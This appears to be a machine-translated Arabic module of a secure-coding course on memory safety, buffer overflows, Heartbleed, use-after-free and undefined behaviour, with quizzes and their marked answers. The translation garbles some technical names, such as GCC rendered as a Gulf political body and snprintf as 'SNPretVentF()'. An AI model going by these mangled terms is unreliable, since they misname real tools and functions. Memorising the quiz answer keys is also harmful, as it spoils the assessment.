لأغراضنا ، لا تتضمن التحويلات تحديد ما إذا كانت القيمة صادقة. بشكل عام ، تحتوي لغات البرمجة على تركيبات شرطية (مثل **** إذا  **وأثناء**) والتي ستنتج نتائج مختلفة اعتمادا على ما إذا كانت قيمة الشرط صحيحة أم لا. ما هو الحقيقة هو قرار تصميم رئيسي عند إنشاء لغة برمجة. على سبيل المثال ، تعتبر كل قيمة في JavaScript صحيحة باستثناء قائمة محددة من القيم الخاطئة (حاليا **false و **0 و **-0** و  **0n** و "" و **null و undefined**** ** ** ** **و ** **NaN**). في مثل هذه اللغات ،  إذا **كانت p** وما شابهها اختصارا للتحقق مما إذا كانت القيمة صحيحة. يمكن اعتبار هذا التفسير في الشرطية تحويلا من نوع آخر إلى نوع منطقي ، لكن مثل هذه التركيبات هي في الحقيقة مجرد طريقة مختصرة لتحديد ما إذا كانت القيمة صحيحة ، وهذا ليس ما يهمنا هنا.

 * يعد تحويل النوع غير الصحيح أو Cast* (CWE-704) سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 28. 2021 CWE Top 25 # 36 يشير إلى حالته الخاصة ، [الوصول إلى الموارد باستخدام نوع غير متوافق ("ارتباك النوع")](https://cwe.mitre.org/data/definitions/704.html) (**CWE-843[).](https://cwe.mitre.org/data/definitions/843.html)


#### اختبار 2.3: تجنب التحويل غير الصحيح أو الإرسال

\>\>أي مما يلي قد يكون مقلقا بشأن طاقم التمثيل؟ حدد جميع الإجابات التي تنطبق.<<

[!x] قد يفقد فريق التمثيل معلومات مهمة.

[x] قد ينتج فريق التمثيل قيمة جديدة غير متوقعة في هذا السياق.

[x] قد يزيل المدلى بها ما إذا كانت القيمة تعتبر ثابتة أم لا ، مما يتسبب في مشاكل محتملة للتعليمات البرمجية الأخرى التي قد تعتمد على كونها ثابتة.

[ ] قد يغير فريق التمثيل النوع.

[تفسير]

يغير المدلى بها نوع القيمة (وهذا هو الغرض *منها*) ، لذلك في حد ذاته لا يثير القلق. ما يثير القلق هو الآثار المحتملة لمثل هذه التغييرات في السياق.

[تفسير]

## معالجة البيانات بأمان: سلوك غير محدد / سلامة الذاكرة

### مواجهة عمليات القراءة والكتابة خارج الحدود (تجاوز سعة المخزن المؤقت)

[رمز الذاكرة غير الآمن]

#### سلامة الذاكرة

لسوء الحظ ، قد يكون التعامل مع البيانات غير الموثوق بها * صعبا بشكل خاص* في بعض لغات البرمجة أو عند تمكين أوضاع لغة برمجة معينة. تمنع معظم لغات البرمجة تلقائيا أي محاولة لقراءة أو كتابة مناطق الذاكرة غير المخصصة. وتسمى هذه *اللغات الذاكرة الآمنة*. ومع ذلك ، فإن آليات أمان الذاكرة بشكل عام لها حمل على الأداء.

نتيجة لذلك ، فإن بعض لغات البرمجة التي تؤكد على الأداء إما *ليست* آمنة للذاكرة أو لديها طريقة لتعطيل أمان الذاكرة. لغات البرمجة المستخدمة على نطاق واسع C و C ++ *ليست* آمنة للذاكرة. هناك أيضا بعض اللغات التي تؤكد على الأداء الذي *عادة* ما يكون  آمنا للذاكرة ، ولكن لديها طريقة لتعطيل فحوصات السلامة لتمكين الأداء المناسب ؛ وتشمل هذه Rust (عند استخدام رمز غير آمن) ، C # (عند استخدام رمز غير آمن) ، و Ada (عند استخدام قمع براغما لقمع فحوصات سلامة الذاكرة).

مشاكل سلامة الذاكرة هي سبب شائع لنقاط الضعف. وجدت دراسة Catalin Cimpanu  ، Microsoft[*: 70 بالمائة من جميع الأخطاء الأمنية هي مشكلات آمنة للذاكرة*](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/) (2019) ، أن حوالي ~ 70٪ من جميع نقاط الضعف في Microsoft في 2006-2018 كانت بسبب مشكلات أمان الذاكرة. علاوة على ذلك ، في حين أن هناك تقلبات سنوية ، فقد كانت مستقرة نسبيا خلال ذلك الوقت:

![كانت سلامة الذاكرة باستمرار نقطة ضعف بمرور الوقت](memory_safety_over_time.png)

**النسبة المئوية لثغرات أمان الذاكرة في Microsoft** (بواسطة Catalin Cimpanu ، 2019 ، تم استردادها من [ZDNet](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

أمان الذاكرة هو مجموعة فرعية من فئة أكبر تسمى  السلوك غير المحدد ، حيث لا يضمن النظام شيئا - وغالبا ما يؤدي *السلوك غير المحدد* إلى ثغرات أمنية. سنناقش هذا الأمر لاحقا ، لكننا سنلاحظ بإيجاز أن C و C ++ لديهما عدد كبير بشكل ملحوظ من السلوكيات غير المحددة ، مما يجعل من الصعب بشكل خاص كتابة برامج آمنة بهذه اللغات.

يمكن أن تواجه هذه المشكلات *حتى إذا* كنت تكتب تعليمات برمجية بلغة آمنة للذاكرة وليس لها سلوكيات غير محددة. قد تستدعي التعليمات البرمجية الخاصة بك بعض التعليمات البرمجية *الأخرى* ذات السلوك غير المحدد الذي يؤدي إلى ثغرات أمنية. نظرا لأن كل برنامج تقريبا ينتهي به الأمر إلى استدعاء بعض التعليمات البرمجية المكتوبة على الأقل ب C أو C ++ ، فهذا يعني أن بعض أجزاء برنامجك على الأقل قد تكون عرضة للخطر بشكل غير مباشر ، حتى لو لم يكن برنامجك مكتوبا بلغة C أو C ++.

واحدة من أشهر حيل المهاجمين هي عمليات القراءة والكتابة خارج الحدود (بما في  ذلك *تجاوز سعة المخزن المؤقت*) - لذلك سنتحدث بإيجاز عن ماهية ذلك وكيفية مواجهته. سنناقش بعد ذلك نوعا آخر من العيوب التي غالبا ما تؤدي إلى ثغرات أمنية ، خالية مزدوجة. أخيرا ، سنناقش الفئة الأكبر من السلوكيات غير المحددة.

#### عمليات القراءة/الكتابة خارج الحدود وتجاوز سعة المخزن المؤقت

أحد أكثر أنواع الثغرات الأمنية شيوعا هو المكان الذي تكون فيه القراءة أو الكتابة  "*خارج الحدود"* داخل التعليمات البرمجية غير الآمنة للذاكرة. مثل هذه الثغرات شائعة ، ويجد المهاجمون سهولة استغلالها. هذه المشكلة معروفة منذ فترة طويلة. يصف ألف وان (إلياس ليفي) بالتفصيل في [*تحطيم المكدس من أجل المتعة والربح*](http://phrack.org/issues/49/14.html#article) (1996) كيفية استغلال نقاط الضعف هذه.

 تعد عمليات القراءة والكتابة خارج الحدود شائعة وخطيرة لدرجة أنه في قائمة CWE Top 25 لعام 2021 ، يتضمن الضعف #1 عمليات الكتابة (CWE-787 [Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)) ، ويتضمن الضعف #3 قراءات* (CWE-125  *قراءة خارج الحدود[) ، والمشكلة العامة هي # 17](https://cwe.mitre.org/data/definitions/125.html)  (*CWE-119* [تقييد غير صحيح للعمليات داخل حدود مخزن الذاكرة المؤقت](https://cwe.mitre.org/data/definitions/119.html)**). في قائمة CWE Top 25 لعام 2019 ، تكون المشكلة العامة هي #1[ (CWE-119  ](https://cwe.mitre.org/data/definitions/119.html)تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت للذاكرة*) ، وحالات محددة منها هي #5 (CWE-125 *  قراءة خارج الحدود[) و # 12 (](https://cwe.mitre.org/data/definitions/125.html)*CWE-787* [](https://cwe.mitre.org/data/definitions/787.html)*كتابة خارج الحدود*).

فيما يلي الأساسيات. يتعين على جميع البرامج تقريبا تخزين النتائج الوسيطة ، وغالبا ما تسمى مناطق التخزين هذه المخازن المؤقتة**. القراءة والكتابة داخل هذا المخزن المؤقت أمر جيد. ولكن ماذا يحدث عندما يحاول برنامجك القراءة من هذا المخزن المؤقت أو الكتابة إليه ، لكنه يحاول القيام بذلك خارج نطاق منطقة التخزين هذه؟ على سبيل المثال ، إليك جزء تافه من برنامج C يخصص بعض الصفيف **x** من  الحجم 10 (قيم الفهرس من 0 إلى 9) ، ثم يخزن لاحقا قيمة y إلى قيمة **الفهرس** **i** لتلك المصفوفة:

~~~~C
    char x[10];
    ...
    x[i] = y;
~~~~

ماذا يحدث إذا  كانت قيمة **i** خارج الحدود (أي لها قيمة أخرى غير 0 إلى 9)؟ هناك خياران آمنان وشائعان يحدثان بلغات برمجة مختلفة:

1. **تغيير الحجم**<br>في العديد من لغات البرمجة ، ستؤدي محاولة الكتابة (أو القراءة) خارج الحدود إلى تغيير حجم المصفوفة بحيث يمكن تخزين القيمة أو القراءة منها.

2. ****<br> خطأ في بعض اللغات، لا سيما تلك التي تركز على الأداء الممتاز، سيتم الإبلاغ عن خطأ (عادة ما يكون استثناء) إذا كان الفهرس خارج الحدود.

لسوء الحظ ، هناك خيار ثالث: يمكن قبول القراءة أو الكتابة خارج الحدود وتحويلها إلى ثغرة أمنية محتملة. إذا كنت تستخدم لغة غير آمنة للذاكرة مثل C أو C ++ أو لغة التجميع، فإن أي قراءة أو كتابة يمكن أن تخرج عن الحدود تعد ثغرة أمنية خطيرة محتملة. يمكن أن تحدث هذه المشكلة أيضا إذا كانت اللغة عادة آمنة للذاكرة، ولكن يمكنك تعطيل عمليات التحقق من أمان ذاكرة اللغة (مثل Rust و C# و Ada).

في C ، أي محاولة للقراءة أو الكتابة خارج حدود المخزن المؤقت (عبر فهرس صفيف أو مؤشر) هي مثال على *السلوك غير المحدد*. إذا قام برنامج C في النهاية بتنفيذ عبارة من شأنها أن تسبب سلوكا غير محدد ، فيسمح للرمز بفعل أي شيء على الإطلاق في أي وقت - حتى قبل تلك العبارة التي تسببت في السلوك غير المحدد! يمكنك العثور على مزيد من المعلومات في المراجع التالية:

* [*مع سلوك غير محدد ، كل شيء ممكن*](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html) (2018) ، بقلم راف ليفيان

* [*يمكن أن يؤدي السلوك غير المحدد إلى السفر عبر الزمن (من بين أمور أخرى ، ولكن السفر عبر الزمن هو الأكثر مرحا*](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633))  (2014) ، بقلم ريموند تشين

* [*دليل للسلوك غير المحدد في C و C ++ (الأجزاء 1-3) (*](http://blog.regehr.org/archives/213) 2010) ، بقلم جون ريجير.

من الناحية *العملية* ، إذا لم يكن هناك أمان للذاكرة ، فغالبا ما تنتهي الكتابة خارج المخزن المؤقت في معظم تطبيقات لغات البرمجة بإفساد هياكل البيانات الداخلية التي يعتمد عليها البرنامج. على سبيل المثال ، قد يقوم بالكتابة فوق المتغيرات المحلية و / أو تغيير ما سيتم تشغيله بعد عودة الدالة. وبالمثل ، غالبا ما تكشف القراءة خارج المخزن المؤقت عن معلومات داخلية لا يتم الكشف عنها عادة ، بما في ذلك الأسرار التي يعتمد عليها الأمان (مثل المفاتيح أو أنظمة التصلب). بالإضافة إلى ذلك ، إذا كانت C أو C ++ ، فغالبا ما يستخدم المترجمون مثل هذه العبارات كترخيص لإنشاء بعض رموز الآلة المفاجئة للغاية (لأنه يسمح لمؤلفي المترجم بافتراض أن مثل هذه الأشياء لن تحدث). شحذ المهاجمون حرفتهم على مدى عقود لاستغلال نقاط الضعف هذه ، لأنها شائعة ويمكنهم في كثير من الأحيان تحويل اكتشاف هذا النوع من نقاط الضعف بسرعة إلى هجوم مدمر.

هناك العديد من الأسماء لهذه الهجمات ، مع اختلاف المصطلحات والمعاني. أحد الاختلافات الأكثر شيوعا لهذه الثغرة الأمنية هو عندما يتمكن المهاجم من الكتابة بعد نهاية الصفيف ، وتسمى هذه الثغرة الأمنية أحيانا ثغرة  تجاوز *سعة المخزن المؤقت الكلاسيكية*. غالبا ما يطلق على الهجوم الذي يستغل هذه الثغرة الأمنية عن طريق كتابة البيانات خارج * المخزن المؤقت هجوم تحطيم المكدس (إذا كان المخزن المؤقت  موجودا على المكدس ، مثل كونه معلمة محلية) * أو هجوم تحطيم *كومة الذاكرة المؤقتة* (إذا كان المخزن المؤقت على الكومة ، أي تم تخصيصه مسبقا بواسطة **جديد** أو **malloc** اعتمادا على اللغة). لدى CWE معرفات وأسماء مختلفة ، بما في ذلك [ CWE-119 (تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت للذاكرة](https://cwe.mitre.org/data/definitions/119.html)) ، وهي حالة خاصة من *CWE-118* ([الوصول غير الصحيح للموارد القابلة للفهرسة ("خطأ النطاق"](https://cwe.mitre.org/data/definitions/118.html))).** 

إذا تمكن أحد المهاجمين من جعل برنامجك يكتب خارج المخزن المؤقت الخاص به ، فغالبا ما يؤدي ذلك إلى ثغرة أمنية خطيرة حيث يمكن للمهاجم أن يتسبب في قيام البرنامج بأي شيء على الإطلاق.

الكتابة غير المحدودة ليست هي المشكلة الوحيدة. تاريخيا ، كان الأشخاص القلقون بشأن الكتابة خارج الحدود أكثر من القراءة ، لكن ثغرة Heartbleed في عام 2014 أظهرت أن القراءات خارج الحدود يمكن أن تكون خطيرة للغاية أيضا. يمكن أن تكشف القراءات خارج الحدود عن معلومات تسمح للمهاجمين باقتحام النظام بالكامل. حتى البرامج التي تسمح فقط ببايت واحد من القراءة أو الكتابة خارج الحدود يمكن أن يكون لها ثغرة أمنية خطيرة.

![نص بديل للصورة](heartbleed.png)

**وأوضح هارتبليد**. تم الاسترجاع من [xkcd](https://xkcd.com/1354/) ، مرخص بموجب [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

>  وقت القصة: هارتبليد

> في عام 2014 ، تم العثور على ثغرة أمنية تسمى Heartbleed (CVE-2014-0160[](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0160)) في مكتبة تشفير OpenSSL المستخدمة على نطاق واسع.  كانت نقطة الضعف الرئيسية هي السماح بقراءة المخزن المؤقت (بعد نهاية المخزن المؤقت) في الكومة بسبب التحقق من صحة الإدخال غير الصحيح. سمحت هذه الثغرة للمهاجمين بالحصول على بيانات حساسة ، وأدار OpenSSL بعض البيانات الحساسة للغاية مثل مفاتيح الخادم الخاصة. أثرت هذه الثغرة الأمنية على عدد كبير من مواقع الويب الشائعة ، مما أدى إلى مشاكل مثل اختطاف حساب المستخدم واختراق المعلومات لملايين المرضى. ([*كيفية منع Heartbleed التالي ، *](https://dwheeler.com/essays/heartbleed.html)2020 ، بقلم ديفيد أ. ويلر)

#### حلول للقراءات والكتابة خارج الحدود

إذا كنت فضوليا ، فهناك العديد من الأوراق والدورات الجامعية التي تتعمق في سبب خطورة هذه المشكلة بالضبط. ولكن إذا كنت تقوم فقط بتطوير برنامج ، فإن هذه التفاصيل لا تهم - تحتاج ببساطة إلى التأكد من أن عمليات القراءة والكتابة تكون دائما ضمن حدود ما يفترض أن تشير إليه. فكيف يمكننا القيام بذلك؟

الحل الأبسط: **_دائما ، حيثما كان ذلك عمليا ، استخدم لغات آمنة للذاكرة وحافظ على أمان الذاكرة_**. جميع لغات البرمجة تقريبا آمنة للذاكرة ، على الأقل افتراضيا. إذا حاولت الوصول إلى مخزن مؤقت خارج حدوده بلغة آمنة للذاكرة ، تغيير حجم المخزن المؤقت أو يعطيك خطأ (عادة استثناء). في كلتا الحالتين ، لا يتنازل النظام عن السيطرة للمهاجم فقط. هذا الحل أسهل في التطبيق عند كتابة التعليمات البرمجية من البداية ، بالطبع.

لكن في بعض الأحيان هذا ليس عمليا. هذا يعني أنه لا يمكنك أبدا استخدام C أو C ++ أو لغة التجميع. قد يعني ذلك أيضا أنه لا يمكنك تعطيل أمان الذاكرة بلغات أخرى. هناك العديد من البرامج الكبيرة في C أو C ++ التي سيكون من الصعب إعادة كتابتها ، وبالطبع ، هناك أسباب لاختيار الناس لتلك اللغات. تتم كتابة معظم نواة نظام التشغيل بلغة C ، نظرا لأنها حرجة الأداء وقد تم تصميم C خصيصا لهذه المهمة. وبالمثل ، في اللغات التي تتيح لك تعطيل أمان الذاكرة ، هناك أسباب لوجود هذه الآليات.

إذا *كان يجب أن* يكون لديك رمز بدون أمان الذاكرة ، فحاول الحد مما هو غير آمن للذاكرة حيث يكون ذلك عمليا. على سبيل المثال، في اللغات الآمنة للذاكرة بشكل افتراضي، ولكن لديها آليات لتعطيلها، يجب تقليل مقدار التعليمات البرمجية التي يتم تشغيلها بدون أمان الذاكرة. يجب أن تكون المكتبة الكبيرة في Rust أو C # أو Ada آمنة تماما تقريبا ، مع وجود جزء صغير جدا غير آمن على الأكثر. إذا كان لديك الكثير من التعليمات البرمجية C أو C ++ الحالية ، ففكر في إعادة كتابة جزء بلغة آمنة للذاكرة. إذا أعدت كتابة جزء ، فيجب عليك عادة التركيز على  الجزء *الأكثر خطورة* (أي الكود الأكثر تعرضا للمهاجمين). على سبيل المثال ، تمت كتابة متصفح Firefox من Mozilla في الغالب بلغة C ++ (وبعض JavaScript) ، ولكن في عام 2017 تم استبدال بعض كود C ++ هذا بتطبيقات في Rust ، وبشكل متزايد يتم كتابة المزيد والمزيد من Firefox في Rust (Mozilla [*Oxidation*](https://wiki.mozilla.org/Oxidation) and [*Rust مقابل C ++ في macOS Firefox Nightly*](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479)).

إذا كان عليك البرمجة بدون فحوصات أمان الذاكرة ، لأي سبب من الأسباب ، فعليك تنفيذ جميع عمليات التحقق في الكود نفسه بعناية. من أجل الأمان ، يجب عليك التأكد من أنك لن ترتكب خطأ أبدا: يجب عليك التأكد من أن كل مرجع في حدود بغض النظر عما يفعله المهاجم. كل شيك ليس من الصعب القيام به. هذا ليس علم الصواريخ. المشكلة هي أنه من الصعب عدم ارتكاب أي خطأ. يمكنك أن تكون ذكيا جدا ولا تزال ترتكب خطأ. إذا كنت تكتب برنامجا بدون فحوصات سلامة الذاكرة ، حيثما أمكن ، يجب عليك استخدام آليات مثل الأدوات ومراجعة الأقران لتقليل مخاطر تسرب شيء ما إلى المستخدمين. في وقت لاحق سنناقش بعض الأدوات المتاحة للمساعدة.

بالطبع ، مجرد إجراء فحص لا يكفي - ماذا تفعل عندما يفشل الشيك؟ أسلم شيء تفعله هو رفض الإدخال وعدم تنفيذ أي إجراء إذا فشل الفحص على طول الطريق. ومع ذلك ، غالبا ما يكون من الصعب القيام بالرفض ، وبالتالي يميل المطورون إلى تقليم أي شيء إضافي (أو كتابة التعليمات البرمجية التي تفعل ذلك عن طريق الخطأ). في بعض الأحيان يكون ذلك جيدا ، ولكن هذا يعني غالبا أن المهاجم يمكنه التحكم في ما يبقى في المخزن المؤقت وما لا يبقى. يمكن أن يؤدي ذلك في بعض الأحيان إلى نقاط ضعف ، وقد يكون تحديد ما إذا كانت هناك ثغرة أمنية أمرا صعبا حقا.

إذا كنت تستخدم C ، فهناك العديد من الأنماط التي من المحتمل أن تكون عرضة للخطر بشكل خاص ، بما في ذلك استخدام وظائف مثل **strcpy() لنسخ سلسلة ، **strcat()** لتسلسل سلسلة ** ، والحلقات التي تضيف بشكل متزايد إلى المخزن المؤقت. في وقت مبكر من تطوير C ، تم إنشاء وظائف محدودة حيث سيتم كتابة البيانات ، وتحديدا **strncpy() ** و **strncat()**. ومع ذلك ، فإن استخدام **strncpy() ** و **strncat()** يتطلب إعادة حساب مستمرة للمساحة *المتبقية *، مما يجعل من الصعب استخدامها بشكل صحيح (من السهل للغاية وجود خطأ "إيقاف التشغيل بواحد" في هذا الرمز الذي يلاحظه المهاجمون فقط). تقوم  الدالة **strncpy()** أيضا بالكتابة فوق كل المساحة المتبقية ، مما يجعلها غير فعالة بشكل سخيف لمعظم الظروف.

إذا كنت تستخدم C ، في بعض الأحيان يمكنك استخدام وظائف أكثر أمانا بدلا من ذلك. تكتب الدالة C **snprintf ()** الإخراج إلى مخزن مؤقت لسلسلة بتنسيق معين ، ولن يتم الكتابة فوقها بعد طول معين. تتيح لك الدالة **memccpy()** عمل نسخة بسيطة ، مرة أخرى دون تجاوز الحد الأقصى للطول. ومع ذلك ، في جميع هذه الحالات ، لا يمكنك فقط استدعاء الوظيفة - في معظم الحالات ، يجب عليك أيضا التحقق من قيمة الإرجاع لمعرفة ما إذا كان هناك تجاوز ، وإذا كان هناك ، فافعل شيئا معقولا (وهو عادة التوقف عن معالجة الإدخال). تتيح لك الدالتان  asprintf () ** و **vasprintf ()**** إعادة تخصيص سلسلة جديدة ، والتي يمكنك استخدامها لتغيير حجم سلسلة. كما هو الحال دائما ، يجب عليك التأكد من تحرير أي سلاسل مخصصة مسبقا بمجرد عدم استخدامها ، والتأكد من تحريرها مرة واحدة فقط (وهي مشكلة سنناقشها قريبا). إذا لم تكن مستعدا للقيام بذلك بعناية فائقة ومنهجية ، فمن المحتمل ألا تستخدم C.

يستخدم المترجمون الحديثون لهذه اللغات وأنظمة التشغيل التي تدعمها مجموعة متنوعة من تقنيات التصلب لجعل استغلال هذه الهجمات أكثر صعوبة. تشمل تدابير التصلب المطبقة على نطاق واسع ما يلي:

* التوزيع العشوائي لتخطيط مساحة العنوان (ASLR)التوزيع العشوائي <br>حيث يتم تخزين الكائنات في الذاكرة ، مما يجعل من الصعب على المهاجمين استهداف بعض الكائنات (في برامج التحويل البرمجي لدول مجلس التعاون الخليجي و clang ، قد تحتاج إلى تمكين وضع PIE ، على سبيل المثال ، باستخدام **-fPIE)**

* ذاكرة غير قابلة للتنفيذ<br>تأكد من أنه لا يمكن أيضا كتابة الذاكرة التي تحتوي على تعليمات قابلة للتنفيذ في نفس الوقت ، مما يجعل من الصعب قليلا على المهاجمين تعديل البرامج أو إدخال التعليمات البرمجية الضارة الخاصة بهم.

* جزر الكناري<br>أدخل فحصا إضافيا في الوظائف المحددة ؛ قبل عودتهم ، يقومون بفحص العقل على قيمة تسمى "حارس" أو "كناري" تكتشف أنواعا معينة من تجاوزات المخزن المؤقت التي تؤدي عمليات الكتابة (يمكن لمترجمي دول مجلس التعاون الخليجي و clang القيام بذلك باستخدام خيارات مثل  -**fstack-protector**)

* إدخالات الحدود الآلية<br>قم بتعديل التعليمات البرمجية أثناء التجميع لإجراء فحص الحدود حتى لو لم يتم طلبها في الأصل (يمكن لمترجمي دول مجلس التعاون الخليجي و clang القيام بذلك باستخدام الخيار **-D_FORTIFY_SOURCE = 2**).

إذا كنت تكتب تعليمة برمجية غير آمنة للذاكرة، أو تستدعي تعليمة برمجية غير آمنة للذاكرة، فتأكد من تمكين تدابير التصلب مثل هذه كلما استطعت، بما في ذلك في التجميع والاختبار والإنتاج. والخبر السار هو أن تدابير التصلب مثل هذه ستبطئ بعض المآثر. ولكن في النهاية ، لا تمنع تدابير التصلب في كثير من الأحيان ** عمليات الاستغلال. في أفضل الأحوال ، تحول إجراءات التصلب هذه "تولي البرنامج" إلى "توقف البرنامج عن العمل" ... وهذا هو *أفضل* حالة. الطريقة الوحيدة لعدم وجود رمز ضعيف ... هو عدم وجود رمز ضعيف.

#### اختبار 2.4: مواجهة عمليات القراءة والكتابة خارج الحدود (تجاوز سعة المخزن المؤقت)

\>\>يجب أن تكون البرامج المكتوبة بلغات غير آمنة للذاكرة، مثل C وC++، حريصة *على عدم السماح أبدا* لمستخدم غير موثوق به بالتسبب في قراءة أو كتابة خارج الحدود. قد يكون من الصعب القيام بذلك دون فشل. يمكن أن يساعد التطبيق الصحيح لوظائف مثل **SNPretVentF()** . صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

صحيح. بالطبع ، من الأكثر أمانا عدم استخدام اللغات غير الآمنة للذاكرة في المقام الأول ، لكن هذا ليس دائما خيارا اليوم.

[تفسير]

### إصدار مزدوج مجاني وخالي من الاستخدام ومفقود

[رمز الذاكرة غير الآمن]

القراءة والكتابة خارج الحدود ليست المشكلة الوحيدة للبرامج المكتوبة بلغات مثل C أو C ++.

عند معالجة المعلومات ، تحتاج عادة إلى تخصيص ذاكرة (على سبيل المثال ، مع ذاكرة **جديدة**) واستخدامها لفترة من الوقت. تتبع معظم لغات البرمجة تلقائيا عندما لا تحتاج إلى استخدام الذاكرة بعد الآن واستعادتها ؛ تسمى هذه العملية *جمع البيانات المهملة التلقائي* أو *إدارة الذاكرة الآلية* (سنستخدم المصطلح الأخير). هناك طرق مختلفة للقيام بإدارة الذاكرة الآلية (الأكثر شيوعا هي عد المراجع أو تتبعها) ، وتختلف المصطلحات ، ولكن النقطة المهمة هي أنه في معظم لغات البرمجة يتم التعامل مع هذا تلقائيا نيابة عنك.

ولكن في بعض لغات البرمجة ، يجب عليك ** تحرير الذاكرة يدويا عند الانتهاء منها. على وجه الخصوص ، هذا صحيح بالنسبة ل C (**مجاني**) و C ++ (**حذف**). إذا نسيت تحرير الذاكرة عند الانتهاء من استخدامها ، فهذا يؤدي إلى "تسرب الذاكرة" ؛ سيستخدم البرنامج بشكل متزايد المزيد والمزيد من الذاكرة. في بعض الحالات ، يمكن أن يؤدي هذا الاستخدام المتزايد للذاكرة إلى ضعف الأداء بشكل متزايد أو تعطل ، وهو فقدان التوافر.

غالبا ما تكون المشكلة الأمنية الأكثر أهمية هي تحرير منطقة الذاكرة يدويا *أكثر* من مرة ؛ وهذا ما يسمى *ب Double Free*. مشكلة أمنية كبيرة أخرى هي *الاستخدام بعد التحرير *، أي استخدام الذاكرة بعد تحريرها. في اللغات الآمنة للذاكرة ، لن يحدث الاستخدام المزدوج المجاني أو الاستخدام بعد الحرية. ومع ذلك ، غالبا ما يؤدي الاستخدام المزدوج المجاني أو الاستخدام بعد في برنامج C أو C ++ إلى إتلاف البنية الأساسية منخفضة المستوى ويمكنه تغيير قيمة قيم البرنامج التي *تبدو* غير مرتبطة.

إذا تمكن أحد المهاجمين من جعل برنامجك مجانيا مرتين أو خاليا من الاستخدام ، فقد يؤدي ذلك إلى ثغرة أمنية خطيرة حيث يمكن للمهاجم أن يتسبب في قيام البرنامج بأي شيء. وذلك لأن هذه الأخطاء غالبا ما تسمح للمهاجم بالفساد والتحكم في البنية التحتية التي يعمل عليها برنامجك.

الحل الواضح هو استخدام لغات البرمجة فقط حيث لا يتعين عليك تحرير الذاكرة يدويا. تتعامل معظم لغات البرمجة مع إدارة الذاكرة تلقائيا.

في الحالات التي لا يكون فيها ذلك عمليا ، قم بتبسيط التعليمات البرمجية الخاصة بك بأفضل ما يمكنك حتى يكون من الواضح أين سيحدث إلغاء التخصيص ، بحيث يحدث مرة واحدة بالضبط ولن تستخدمه مرة أخرى أبدا. ضع في اعتبارك تعيين مؤشرات إلى NULL (0) عند الانتهاء مما تشير إليه. سيؤدي ذلك إلى تقليل مخاطر تحريرها أو استخدامها مرة أخرى لاحقا ، وإذا لم تكن هناك حاجة ، تحسين العديد من هذه المهام بواسطة المترجم.

 يعد الاستخدام بعد المجاني سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 7 و 2019 CWE Top 25 # 7. إنه [CWE-416](https://cwe.mitre.org/data/definitions/416.html) (*استخدم بعد مجانا*). يعد Double-free سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 31. إنه [CWE-415](https://cwe.mitre.org/data/definitions/415.html) (*مزدوج مجاني*).  الفشل في تحرير الذاكرة بمجرد عدم الحاجة إليها هو 2021 CWE Top 25 # 32; إنه [CWE-401](https://cwe.mitre.org/data/definitions/401.html) (الإصدار المفقود للذاكرة بعد العمر الفعال).

#### اختبار 2.5: إصدار مزدوج مجاني ، والاستخدام بعد الإصدار ، والمفقود

\>\>في C و C ++ ، لا يهم إذا كنت تستخدم منطقة ذاكرة بعد تحريرها ، طالما أنك تستخدم منطقة الذاكرة ضمن نفس الوظيفة أو الطريقة. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

لا ، ليس من الآمن استخدام منطقة ذاكرة بعد تحريرها ، بغض النظر عن السبب. *قد* ينجح في وقت محدد ، وليس آخر.

[تفسير]

### تجنب السلوك غير المحدد

[رمز الذاكرة غير الآمن]

يتم تعريف العديد من لغات البرمجة في نوع من المواصفات الرسمية. عندما يكون الأمر كذلك ، حيثما كان ذلك عمليا ، يجب أن تحاول كتابة التعليمات البرمجية التي تتوافق مع تلك المواصفات ، لأنه من المرجح أن تعمل التعليمات البرمجية الخاصة بك في جميع الحالات ، ومع تغير تطبيقات اللغة ، من المرجح أن تستمر التعليمات البرمجية الخاصة بك في العمل.

في بعض الأحيان ، تسمح هذه المواصفات بواحد من عدة خيارات مختلفة (يسمى هذا أحيانا "سلوك غير محدد" أو "سلوك خاص بالمترجم"). يجب أن تحاول عادة كتابة التعليمات البرمجية الخاصة بك بحيث لا يهم الخيار المسموح به المستخدم ، وسوف تستمر في العمل. تسمح اللغات التي تدعم مؤشر الترابط بتنفيذ مؤشرات الترابط بالتوازي وبترتيب عشوائي. في العديد من اللغات ، لا يتم تعريف ترتيب العمليات في مكالمة مثل  f (aa **، bb ، cc)** (أي أنه لا يضمن حساب **aa** أو **cc** أولا). احذر من الاعتماد على ما تفعله أدواتك حاليا ، لأنه عندما تتم ترقية الأدوات ، قد يتغير ما تفعله. بالنسبة للعديد من المطورين ، فإن التعامل مع هذا هو بالفعل طبيعة ثانية.

ومع ذلك ، تحتوي بعض اللغات (مثل C و C ++) على بنيات ذات *سلوك غير محدد* حقا. أي إذا اتخذت إجراءات معينة ، فإن المواصفات لا تضمن *شيئا على الإطلاق*. على سبيل المثال  ، تشير [الأسئلة الشائعة C](http://c-faq.com/ansi/undef.html) إلى أنه مع السلوك غير المحدد ، *"يمكن أن يحدث أي شيء على الإطلاق. المعيار لا يفرض أي متطلبات. قد يفشل البرنامج في التجميع ، أو قد يتم تنفيذه بشكل غير صحيح (إما يتعطل أو يولد نتائج غير صحيحة بصمت) ، أو قد يفعل بالصدفة ما قصده المبرمج بالضبط.*

يمكن أن يكون أي سلوك غير محدد - وغالبا ما يكون - ثغرة أمنية. حتى إذا لم تكن ثغرة أمنية اليوم ، فقد تؤدي ترقية طفيفة في أدواتك أو نظام التشغيل أو التكوين إلى تحويلها إلى ثغرة أمنية.

